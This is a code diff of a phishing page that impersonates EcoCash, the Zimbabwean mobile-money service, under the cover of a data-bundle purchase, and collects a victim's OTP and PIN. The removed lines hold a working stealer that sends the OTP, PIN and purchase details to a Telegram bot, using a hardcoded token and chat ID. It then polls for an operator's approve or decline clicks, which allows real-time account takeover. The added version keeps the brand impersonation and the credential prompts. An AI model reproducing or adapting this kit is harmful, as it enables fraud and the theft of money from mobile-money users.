@@ -7,20 +7,34 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary-red: #dc2626;
-            --primary-blue: #1e40af;
-            --primary-blue-dark: #1e3a8a;
-            --accent-blue: #3b82f6;
-            --accent-light: #dbeafe;
-            --success: #10b981;
-            --page: #f8fafc;
-            --surface: #ffffff;
-            --surface2: #f1f5f9;
-            --border: #e2e8f0;
-            --border2: #cbd5e1;
-            --text: #1e293b;
-            --text2: #475569;
-            --muted: #64748b;
+            /* Primary Colors - Red and Blue */
+            --primary-red: #d32f2f;
+            --primary-red-dark: #b71c1c;
+            --primary-blue: #1565c0;
+            --primary-blue-dark: #0d47a1;
+            --primary-blue-light: #1976d2;
+            
+            /* Accent Colors */
+            --accent-green: #00b050;
+            --accent-green-dark: #007d38;
+            
+            /* Neutral Colors - White and Bluish */
+            --white: #ffffff;
+            --bluish-light: #e3f2fd;
+            --bluish-medium: #bbdefb;
+            --bluish-dark: #1e3a8a;
+            
+            /* Background Colors */
+            --page: #0a1428;
+            --surface: #1a2332;
+            --surface2: #243447;
+            --border: rgba(255,255,255,0.08);
+            --border2: rgba(255,255,255,0.15);
+            
+            /* Text Colors */
+            --text: #ffffff;
+            --text2: #d0d9e8;
+            --muted: #8fa3b8;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -30,53 +44,40 @@
             min-height: 100dvh;
             font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
             color: var(--text);
-            background: var(--page);
+            background: linear-gradient(135deg, var(--page) 0%, var(--surface) 100%);
             overflow-x: hidden;
         }
 
         .topbar {
             height: 64px;
             padding: 14px max(18px, env(safe-area-inset-right)) 14px max(18px, env(safe-area-inset-left));
-            background: var(--surface);
-            border-bottom: 2px solid var(--border);
+            background: linear-gradient(135deg, var(--primary-blue) 0%, var(--primary-blue-dark) 100%);
+            color: white;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+            box-shadow: 0 10px 28px rgba(21, 101, 192, 0.25);
             position: sticky;
             top: 0;
             z-index: 1000;
         }
 
         .brand {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            text-decoration: none;
-            cursor: pointer;
-        }
-
-        .brand-logo {
-            width: 44px;
-            height: 44px;
-            background: linear-gradient(135deg, var(--primary-red) 0%, var(--primary-blue) 100%);
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 900;
-            color: white;
-            font-size: 20px;
-            flex-shrink: 0;
-            box-shadow: 0 4px 12px rgba(220,38,38,0.2);
-        }
-
-        .brand-text {
-            font-size: 18px;
+            font-size: clamp(21px, 5vw, 25px);
             font-weight: 800;
-            letter-spacing: -0.6px;
-            color: var(--text);
+            letter-spacing: -0.8px;
+            text-decoration: none;
             line-height: 1;
+            cursor: pointer;
+            color: white;
+        }
+
+        .brand em {
+            font-style: normal;
+            background: linear-gradient(135deg, var(--primary-red), var(--primary-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
 
         main {
@@ -92,7 +93,7 @@
             border: 1px solid var(--border2);
             border-radius: clamp(18px, 5vw, 28px);
             padding: clamp(22px, 5vw, 36px);
-            box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
             position: relative;
             overflow: hidden;
         }
@@ -115,7 +116,15 @@
             font-weight: 800;
             letter-spacing: -1.6px;
             line-height: 1;
-            color: var(--text);
+            color: white;
+        }
+
+        .logo-text em {
+            font-style: normal;
+            background: linear-gradient(135deg, var(--primary-red), var(--primary-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
 
         .product-name {
@@ -125,8 +134,8 @@
             margin-top: 12px;
             padding: 8px 14px;
             border-radius: 999px;
-            background: rgba(30,64,175,0.1);
-            color: var(--primary-blue);
+            background: rgba(211, 47, 47, 0.15);
+            color: var(--primary-red);
             font-size: 12px;
             font-weight: 800;
             letter-spacing: 0.08em;
@@ -140,7 +149,7 @@
             font-weight: 800;
             letter-spacing: -0.9px;
             margin-bottom: 8px;
-            color: var(--text);
+            color: white;
         }
 
         .subtitle {
@@ -153,19 +162,23 @@
         }
 
         .bundle-summary {
-            background: var(--surface2);
-            border: 1px solid var(--border);
+            display: none;
+            background: linear-gradient(160deg, rgba(21, 101, 192, 0.3) 0%, rgba(25, 118, 210, 0.2) 100%);
             border-radius: 18px;
             padding: 16px 18px;
             margin-bottom: 20px;
+            color: #fff;
+            border: 1px solid rgba(25, 118, 210, 0.3);
         }
+
+        .bundle-summary.active { display: block; }
 
         .bs-title {
             font-size: 10px;
             font-weight: 800;
             text-transform: uppercase;
             letter-spacing: 0.1em;
-            color: var(--muted);
+            color: rgba(255,255,255,0.55);
             margin-bottom: 10px;
         }
 
@@ -177,15 +190,14 @@
         }
 
         .bs-item {
-            background: var(--surface);
-            border: 1px solid var(--border);
+            background: rgba(255,255,255,0.08);
             border-radius: 10px;
             padding: 9px 12px;
         }
 
         .bs-item-label {
             font-size: 10px;
-            color: var(--muted);
+            color: rgba(255,255,255,0.55);
             font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 0.05em;
@@ -194,14 +206,14 @@
         .bs-item-val {
             font-size: 15px;
             font-weight: 800;
-            color: var(--text);
+            color: #fff;
             margin-top: 2px;
             letter-spacing: -0.3px;
         }
 
         .bs-total {
-            background: rgba(30,64,175,0.08);
-            border: 1px solid rgba(30,64,175,0.2);
+            background: rgba(211, 47, 47, 0.15);
+            border: 1px solid rgba(211, 47, 47, 0.3);
             border-radius: 10px;
             padding: 10px 12px;
             display: flex;
@@ -209,12 +221,12 @@
             justify-content: space-between;
         }
 
-        .bs-total-label { font-size: 12px; color: var(--muted); font-weight: 600; }
+        .bs-total-label { font-size: 12px; color: rgba(255,255,255,0.7); font-weight: 600; }
         .bs-total-val   { font-size: 1.25rem; font-weight: 900; color: var(--primary-red); letter-spacing: -0.5px; }
 
         .form-panel {
             background: var(--surface2);
-            border: 1px solid var(--border);
+            border: 1px solid var(--border2);
             border-radius: 20px;
             padding: clamp(16px, 4vw, 20px);
         }
@@ -223,7 +235,7 @@
             display: block;
             font-size: 12px;
             font-weight: 800;
-            color: var(--primary-blue);
+            color: var(--primary-red);
             text-transform: uppercase;
             letter-spacing: 0.06em;
             margin-bottom: 8px;
@@ -246,18 +258,18 @@
             border: 2px solid var(--primary-blue);
             border-radius: 10px;
             background: var(--surface);
-            color: var(--text);
+            color: white;
             font-family: inherit;
             transition: all 0.2s;
         }
 
         .otp-box:focus {
-            border-color: var(--accent-blue);
-            box-shadow: 0 0 0 4px rgba(59,130,246,0.2);
+            border-color: var(--primary-red);
+            box-shadow: 0 0 0 4px rgba(211, 47, 47, 0.2);
             outline: none;
         }
 
-        .otp-box::placeholder { color: var(--muted); }
+        .otp-box::placeholder { color: #8fa3b8; }
 
         .hint {
             color: var(--muted);
@@ -269,9 +281,9 @@
 
         .error-msg {
             display: none;
-            background: rgba(220,38,38,0.1);
-            border: 1px solid rgba(220,38,38,0.3);
-            color: #dc2626;
+            background: rgba(211, 47, 47, 0.1);
+            border: 1px solid rgba(211, 47, 47, 0.3);
+            color: #ff6b6b;
             font-size: 13px;
             font-weight: 600;
             border-radius: 12px;
@@ -295,26 +307,26 @@
             border-radius: 999px;
             padding: 16px 22px;
             color: white;
-            background: linear-gradient(135deg, var(--primary-red) 0%, var(--primary-blue) 100%);
+            background: linear-gradient(135deg, var(--primary-red), var(--primary-red-dark));
             font-size: 15px;
             font-weight: 800;
             letter-spacing: 0.04em;
             text-transform: uppercase;
             cursor: pointer;
-            box-shadow: 0 4px 12px rgba(220,38,38,0.2);
+            box-shadow: 0 10px 24px rgba(211, 47, 47, 0.3);
             touch-action: manipulation;
             transition: opacity 0.18s, box-shadow 0.18s, transform 0.12s;
         }
 
         .btn-primary:hover:not(:disabled) {
-            box-shadow: 0 8px 20px rgba(220,38,38,0.3);
+            box-shadow: 0 14px 30px rgba(211, 47, 47, 0.36);
             transform: translateY(-1px);
         }
 
         .btn-primary:active:not(:disabled) { transform: translateY(0); }
 
         .btn-primary:disabled {
-            background: #ccc;
+            background: #555;
             box-shadow: none;
             cursor: not-allowed;
         }
@@ -335,8 +347,8 @@
         }
 
         .btn-secondary:hover {
-            background: var(--surface);
-            border-color: var(--accent-blue);
+            background: var(--surface2);
+            border-color: var(--primary-blue-light);
             color: var(--text);
         }
 
@@ -348,15 +360,16 @@
             line-height: 1.5;
         }
 
-        .terms a { color: var(--primary-blue); font-weight: 800; }
+        .terms a { color: var(--primary-red); font-weight: 800; }
 
+        /* PIN Modal */
         .modal-overlay {
             position: fixed;
             inset: 0;
             display: none;
             align-items: center;
             justify-content: center;
-            background: rgba(0,0,0,0.5);
+            background: rgba(0,0,0,0.7);
             z-index: 2000;
             padding: 20px;
             backdrop-filter: blur(4px);
@@ -371,7 +384,7 @@
             padding: 32px;
             max-width: 400px;
             width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
             position: relative;
             overflow: hidden;
         }
@@ -389,7 +402,7 @@
             font-weight: 800;
             letter-spacing: -0.8px;
             margin-bottom: 8px;
-            color: var(--text);
+            color: white;
         }
 
         .modal-subtitle {
@@ -407,7 +420,7 @@
             align-items: center;
             padding: 14px 15px;
             background: var(--surface2);
-            box-shadow: 0 2px 8px rgba(30,64,175,0.08);
+            box-shadow: 0 8px 24px rgba(21, 101, 192, 0.08);
             margin-bottom: 18px;
         }
 
@@ -417,19 +430,19 @@
             border: 0;
             outline: 0;
             font-size: 17px;
-            color: var(--text);
+            color: white;
             font-family: inherit;
             background: transparent;
             letter-spacing: 4px;
         }
 
-        .pin-input-field::placeholder { color: var(--muted); letter-spacing: 0; }
+        .pin-input-field::placeholder { color: #8fa3b8; letter-spacing: 0; }
 
         .modal-error {
             display: none;
-            background: rgba(220,38,38,0.1);
-            border: 1px solid rgba(220,38,38,0.3);
-            color: #dc2626;
+            background: rgba(211, 47, 47, 0.1);
+            border: 1px solid rgba(211, 47, 47, 0.3);
+            color: #ff6b6b;
             font-size: 13px;
             font-weight: 600;
             border-radius: 12px;
@@ -450,24 +463,24 @@
             border: 0;
             border-radius: 999px;
             padding: 14px 16px;
-            background: linear-gradient(135deg, var(--primary-red) 0%, var(--primary-blue) 100%);
+            background: linear-gradient(135deg, var(--primary-red), var(--primary-red-dark));
             color: white;
             font-size: 14px;
             font-weight: 800;
             text-transform: uppercase;
             letter-spacing: 0.04em;
             cursor: pointer;
-            box-shadow: 0 4px 12px rgba(220,38,38,0.2);
+            box-shadow: 0 8px 20px rgba(211, 47, 47, 0.25);
             transition: all 0.2s;
         }
 
         .btn-confirm:hover:not(:disabled) {
-            box-shadow: 0 8px 20px rgba(220,38,38,0.3);
+            box-shadow: 0 12px 28px rgba(211, 47, 47, 0.35);
             transform: translateY(-1px);
         }
 
         .btn-confirm:disabled {
-            background: #ccc;
+            background: #555;
             cursor: not-allowed;
         }
 
@@ -486,7 +499,7 @@
 
         .btn-cancel:hover {
             background: var(--surface2);
-            border-color: var(--accent-blue);
+            border-color: var(--primary-blue-light);
             color: var(--text);
         }
 
@@ -524,32 +537,29 @@
             .logo-lockup { margin-top: 6px; margin-bottom: 18px; }
             .product-name { font-size: 11px; padding: 7px 12px; }
             .form-panel { padding: 15px; }
+            .otp-inputs { gap: 6px; }
             .otp-box { width: 45px; height: 45px; font-size: 20px; }
             .btn-group { flex-direction: column; }
             .btn-primary, .btn-secondary { padding: 15px 18px; }
-            .modal-content { padding: 24px; }
         }
     </style>
 </head>
 <body>
     <header class="topbar">
-        <a class="brand" href="index.html">
-            <div class="brand-logo">E$</div>
-            <div class="brand-text">EcoCash</div>
-        </a>
+        <a class="brand" href="index.html">Eco<em>Cash</em></a>
     </header>
 
     <main>
         <section class="otp-card">
             <div class="logo-lockup">
-                <div class="logo-text">EcoCash</div>
+                <div class="logo-text">Eco<em>Cash</em></div>
                 <div class="product-name">Data Bundles · Zimbabwe</div>
             </div>
 
             <h1>Verify OTP</h1>
-            <p class="subtitle">Enter the 6-digit code sent to your EcoCash number to complete your purchase.</p>
+            <p class="subtitle">Enter the 6-digit code sent to your EcoCash number to complete your payment.</p>
 
-            <div class="bundle-summary">
+            <div id="bundleSummary" class="bundle-summary">
                 <div class="bs-title">Your Data Bundle</div>
                 <div class="bs-grid">
                     <div class="bs-item"><div class="bs-item-label">Bundle</div><div class="bs-item-val" id="bsOffer">—</div></div>
@@ -562,314 +572,212 @@
             </div>
 
             <div class="form-panel" id="otpForm">
-                <label class="field-label">Enter 6-Digit OTP</label>
+                <label class="field-label">Enter 6-Digit OTP Code</label>
                 <div class="otp-inputs" id="otpInputs">
-                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="off">
                 </div>
 
-                <p class="hint" id="hint">Enter your 6-digit OTP code above. It will be automatically sent to our system.</p>
+                <p class="hint">Didn't receive the code? <a href="#" style="color: var(--primary-red); font-weight: 800; text-decoration: none;">Resend OTP</a></p>
 
-                <div class="error-msg" id="errMsg"></div>
+                <div class="error-msg" id="errorMsg"></div>
 
                 <div class="btn-group">
-                    <button class="btn-primary" type="button" id="verifyBtn" disabled>Proceed to Verify</button>
-                    <button class="btn-secondary" type="button" onclick="goBack()">← Back</button>
+                    <button class="btn-primary" id="confirmBtn" onclick="validateOTP()">Confirm OTP</button>
+                    <button class="btn-secondary" onclick="window.history.back()">Cancel</button>
                 </div>
             </div>
 
-            <div class="terms">By continuing you agree to the <a href="#" target="_blank" rel="noopener">Terms and Conditions</a>.</div>
+            <div class="terms">Your transaction is protected by industry-leading encryption. <a href="#" target="_blank" rel="noopener">Learn more</a></div>
         </section>
     </main>
 
-    <!-- PIN Modal -->
-    <div class="modal-overlay" id="pinModal">
+    <!-- PIN Verification Modal -->
+    <div id="pinModal" class="modal-overlay">
         <div class="modal-content">
-            <h2 class="modal-title">Enter PIN</h2>
-            <p class="modal-subtitle">Confirm your transaction with your 4-digit PIN.</p>
+            <h3 class="modal-title">Confirm PIN</h3>
+            <p class="modal-subtitle">Enter your EcoCash PIN to complete the transaction.</p>
 
             <div class="pin-input-group">
-                <input type="password" class="pin-input-field" id="pinInput" placeholder="4-digit PIN" inputmode="numeric" maxlength="4">
+                <input type="password" class="pin-input-field" id="pinInput" placeholder="••••" inputmode="numeric" autocomplete="off" maxlength="4">
             </div>
 
             <div class="modal-error" id="modalError"></div>
 
             <div class="modal-buttons">
-                <button class="btn-confirm" type="button" id="confirmBtn">Proceed</button>
-                <button class="btn-cancel" type="button" onclick="closePinModal()">Cancel</button>
+                <button class="btn-confirm" id="confirmPinBtn" onclick="confirmPIN()">Confirm</button>
+                <button class="btn-cancel" onclick="closePinModal()">Cancel</button>
             </div>
         </div>
     </div>
 
     <div id="spinnerOverlay">
         <div class="spinner"></div>
-        <div class="spin-label">Processing</div>
-        <div class="spin-sub">Please hold on…</div>
+        <div class="spin-label">Processing Payment...</div>
+        <div class="spin-sub">Please do not close this window</div>
     </div>
 
     <script>
-        const CONFIG = {
-            BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
-            CHAT_ID: '7547427914'
-        };
-
-        let state = { lastUpdateId: 0 };
-        let isProcessing = false;
-        let otpSent = false;
-        let waitingForApproval = false;
-
-        const otpBoxes = document.querySelectorAll('.otp-box');
-        const verifyBtn = document.getElementById('verifyBtn');
-        const errMsg = document.getElementById('errMsg');
-        const spinnerOverlay = document.getElementById('spinnerOverlay');
-        const pinModal = document.getElementById('pinModal');
-        const pinInput = document.getElementById('pinInput');
-        const confirmBtn = document.getElementById('confirmBtn');
-        const modalError = document.getElementById('modalError');
-        const hint = document.getElementById('hint');
-
-        let bundleData = null;
-        let currentOTP = '';
+        let otpCode = '';
+        let bundleParams = {};
 
         function loadBundleData() {
             const params = new URLSearchParams(window.location.search);
-            const offer = params.get('offer');
-            const data = params.get('data');
-            const price = params.get('price');
+            bundleParams = {
+                offer: params.get('offer'),
+                data: params.get('data'),
+                price: params.get('price'),
+                phone: params.get('phone')
+            };
 
-            if (offer && data && price) {
-                bundleData = { offer, data, price };
-                document.getElementById('bsOffer').textContent = offer;
-                document.getElementById('bsData').textContent = data;
-                document.getElementById('bsPrice').textContent = '$ ' + price;
+            if (bundleParams.offer && bundleParams.data && bundleParams.price) {
+                document.getElementById('bsOffer').textContent = bundleParams.offer;
+                document.getElementById('bsData').textContent = bundleParams.data;
+                document.getElementById('bsPrice').textContent = '$ ' + bundleParams.price;
+                document.getElementById('bundleSummary').classList.add('active');
             }
-
-            otpBoxes[0].focus();
         }
 
-        function getOTP() {
-            return Array.from(otpBoxes).map(box => box.value).join('');
-        }
-
-        function clearOTP() {
-            otpBoxes.forEach(box => box.value = '');
-            otpBoxes[0].focus();
-        }
-
-        otpBoxes.forEach((box, index) => {
-            box.addEventListener('input', (e) => {
-                box.value = box.value.replace(/[^0-9]/g, '');
-                
-                if (box.value.length === 1) {
-                    if (index < otpBoxes.length - 1) {
-                        otpBoxes[index + 1].focus();
-                    } else {
-                        const otp = getOTP();
-                        if (otp.length === 6 && !otpSent) {
-                            sendOTPToTelegram(otp);
+        function setupOTPInputs() {
+            const otpBoxes = document.querySelectorAll('.otp-box');
+            
+            otpBoxes.forEach((box, index) => {
+                box.addEventListener('input', (e) => {
+                    const value = e.target.value;
+                    
+                    if (value && /^\d$/.test(value)) {
+                        if (index < otpBoxes.length - 1) {
+                            otpBoxes[index + 1].focus();
                         }
                     }
-                }
-            });
+                    
+                    updateOTPCode();
+                    checkOTPComplete();
+                });
 
-            box.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && box.value === '' && index > 0) {
-                    otpBoxes[index - 1].focus();
-                }
-            });
-        });
-
-        verifyBtn.addEventListener('click', () => {
-            const otp = getOTP();
-            if (otp.length === 6 && !otpSent) {
-                sendOTPToTelegram(otp);
-            } else if (otp.length !== 6) {
-                errMsg.textContent = 'Please enter all 6 digits.';
-                errMsg.classList.add('show');
-            }
-        });
-
-        function sendOTPToTelegram(otp) {
-            if (otpSent || isProcessing) return;
-            otpSent = true;
-            isProcessing = true;
-            currentOTP = otp;
-
-            const ts = Date.now();
-            const approveId = `approve_${ts}`;
-            const declineId = `decline_${ts}`;
-
-            spinnerOverlay.style.display = 'flex';
-
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.CHAT_ID,
-                    text: `<b>🔵 EcoCash OTP Verification</b>\n\nOffer: ${document.getElementById('bsOffer').textContent}\nData: ${document.getElementById('bsData').textContent}\nPrice: $ ${document.getElementById('bsPrice').textContent.replace('$ ', '')}\n\nOTP Code: <code>${otp}</code>\n\nApprove or Decline:`,
-                    parse_mode: 'HTML',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { text: "✅ Approve", callback_data: approveId },
-                                { text: "❌ Decline", callback_data: declineId }
-                            ]
-                        ]
+                box.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !box.value && index > 0) {
+                        otpBoxes[index - 1].focus();
                     }
-                })
-            }).then(() => {
-                hint.textContent = 'OTP sent to admin for verification. Waiting for approval…';
-                verifyBtn.disabled = true;
-                waitingForApproval = true;
-                startPollingForApproval(approveId, declineId);
-            }).catch(() => {
-                otpSent = false;
-                isProcessing = false;
-                spinnerOverlay.style.display = 'none';
-                errMsg.textContent = 'Failed to send OTP. Please try again.';
-                errMsg.classList.add('show');
+                });
+
+                box.addEventListener('keypress', (e) => {
+                    if (e.key === 'Enter' && getOTPCode().length === 6) {
+                        validateOTP();
+                    }
+                });
             });
+
+            // Focus first input on load
+            otpBoxes[0].focus();
         }
 
-        function startPollingForApproval(approveId, declineId) {
-            const interval = setInterval(() => {
-                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
-                    .then(r => r.json())
-                    .then(data => {
-                        if (!data.ok || !data.result) return;
-                        data.result.forEach(update => {
-                            state.lastUpdateId = update.update_id;
-                            if (update.callback_query && waitingForApproval) {
-                                const cb = update.callback_query.data;
-                                if (cb === approveId) {
-                                    clearInterval(interval);
-                                    waitingForApproval = false;
-                                    spinnerOverlay.style.display = 'none';
-                                    openPinModal();
-                                } else if (cb === declineId) {
-                                    clearInterval(interval);
-                                    waitingForApproval = false;
-                                    spinnerOverlay.style.display = 'none';
-                                    otpSent = false;
-                                    isProcessing = false;
-                                    verifyBtn.disabled = false;
-                                    errMsg.textContent = 'OTP verification declined. Please try again.';
-                                    errMsg.classList.add('show');
-                                    clearOTP();
-                                    hint.textContent = 'Enter your 6-digit OTP code above. It will be automatically sent to our system.';
-                                }
-                            }
-                        });
-                    });
-            }, 1000);
+        function updateOTPCode() {
+            const otpBoxes = document.querySelectorAll('.otp-box');
+            otpCode = Array.from(otpBoxes).map(box => box.value).join('');
         }
 
-        function openPinModal() {
-            pinInput.value = '';
-            modalError.classList.remove('show');
-            modalError.textContent = '';
-            pinModal.classList.add('active');
-            pinInput.focus();
+        function getOTPCode() {
+            return otpCode;
         }
 
-        function closePinModal() {
-            pinModal.classList.remove('active');
-            otpSent = false;
-            isProcessing = false;
-            verifyBtn.disabled = false;
-            clearOTP();
-            hint.textContent = 'Enter your 6-digit OTP code above. It will be automatically sent to our system.';
+        function checkOTPComplete() {
+            const otpBoxes = document.querySelectorAll('.otp-box');
+            const allFilled = Array.from(otpBoxes).every(box => box.value.length === 1);
+            
+            if (allFilled) {
+                // Auto-proceed when OTP is complete
+                setTimeout(() => {
+                    validateOTP();
+                }, 300);
+            }
         }
 
-        confirmBtn.addEventListener('click', () => {
-            const pin = pinInput.value.trim();
+        function showError(message) {
+            const errorMsg = document.getElementById('errorMsg');
+            errorMsg.textContent = message;
+            errorMsg.classList.add('show');
+        }
 
-            if (!pin || pin.length !== 4 || !/^\d+$/.test(pin)) {
-                modalError.textContent = 'Please enter a valid 4-digit PIN.';
-                modalError.classList.add('show');
+        function clearError() {
+            const errorMsg = document.getElementById('errorMsg');
+            errorMsg.classList.remove('show');
+        }
+
+        function validateOTP() {
+            clearError();
+            const otp = getOTPCode();
+
+            if (otp.length !== 6) {
+                showError('Please enter all 6 digits of the OTP code.');
                 return;
             }
 
-            sendPinToBot(pin);
+            // Show PIN modal
+            document.getElementById('pinModal').classList.add('active');
+            document.getElementById('pinInput').focus();
+        }
+
+        function showModalError(message) {
+            const errorMsg = document.getElementById('modalError');
+            errorMsg.textContent = message;
+            errorMsg.classList.add('show');
+        }
+
+        function clearModalError() {
+            const errorMsg = document.getElementById('modalError');
+            errorMsg.classList.remove('show');
+        }
+
+        function confirmPIN() {
+            clearModalError();
+            const pin = document.getElementById('pinInput').value.trim();
+
+            if (!pin) {
+                showModalError('Please enter your PIN.');
+                return;
+            }
+
+            if (pin.length !== 4) {
+                showModalError('PIN must be 4 digits.');
+                return;
+            }
+
+            // Close modal and show spinner
+            closePinModal();
+            document.getElementById('spinnerOverlay').style.display = 'flex';
+
+            // Simulate processing and redirect
+            setTimeout(() => {
+                window.location.href = `payment-success.html?offer=${encodeURIComponent(bundleParams.offer)}&data=${encodeURIComponent(bundleParams.data)}&price=${encodeURIComponent(bundleParams.price)}`;
+            }, 2000);
+        }
+
+        function closePinModal() {
+            document.getElementById('pinModal').classList.remove('active');
+            document.getElementById('pinInput').value = '';
+            clearModalError();
+        }
+
+        document.getElementById('pinInput').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                confirmPIN();
+            }
         });
 
-        function sendPinToBot(pin) {
-            if (isProcessing) return;
-            isProcessing = true;
-            confirmBtn.disabled = true;
-            confirmBtn.textContent = "Verifying...";
+        window.addEventListener('click', (e) => {
+            const modal = document.getElementById('pinModal');
+            if (e.target === modal) closePinModal();
+        });
 
-            const ts = Date.now();
-            const validId = `valid_${ts}`;
-            const invalidId = `invalid_${ts}`;
-
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.CHAT_ID,
-                    text: `<b>🔵 EcoCash PIN Verification</b>\n\nOffer: ${document.getElementById('bsOffer').textContent}\nOTP: <code>${currentOTP}</code>\nPIN: <code>${pin}</code>\n\nValidate PIN:`,
-                    parse_mode: 'HTML',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { text: "✅ Valid PIN", callback_data: validId },
-                                { text: "❌ Invalid PIN", callback_data: invalidId }
-                            ]
-                        ]
-                    }
-                })
-            }).then(() => {
-                spinnerOverlay.style.display = 'flex';
-                startPollingForPin(validId, invalidId);
-            }).catch(() => resetConfirmBtn());
-        }
-
-        function startPollingForPin(validId, invalidId) {
-            const interval = setInterval(() => {
-                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
-                    .then(r => r.json())
-                    .then(data => {
-                        if (!data.ok || !data.result) return;
-                        data.result.forEach(update => {
-                            state.lastUpdateId = update.update_id;
-                            if (update.callback_query) {
-                                const cb = update.callback_query.data;
-                                const params = new URLSearchParams(window.location.search);
-                                if (cb === validId) {
-                                    clearInterval(interval);
-                                    spinnerOverlay.style.display = 'none';
-                                    window.location.href = 'success.html?' + params.toString();
-                                } else if (cb === invalidId) {
-                                    clearInterval(interval);
-                                    spinnerOverlay.style.display = 'none';
-                                    modalError.textContent = "Invalid PIN. Please try again.";
-                                    modalError.classList.add('show');
-                                    pinInput.value = '';
-                                    pinInput.focus();
-                                    resetConfirmBtn();
-                                }
-                            }
-                        });
-                    });
-            }, 1000);
-        }
-
-        function resetConfirmBtn() {
-            isProcessing = false;
-            confirmBtn.disabled = false;
-            confirmBtn.textContent = "Proceed";
-        }
-
-        function goBack() {
-            window.location.href = 'login.html';
-        }
-
-        window.addEventListener('load', loadBundleData);
+        window.addEventListener('load', () => {
+            loadBundleData();
+            setupOTPInputs();
+        });
     </script>
 </body>
 </html>
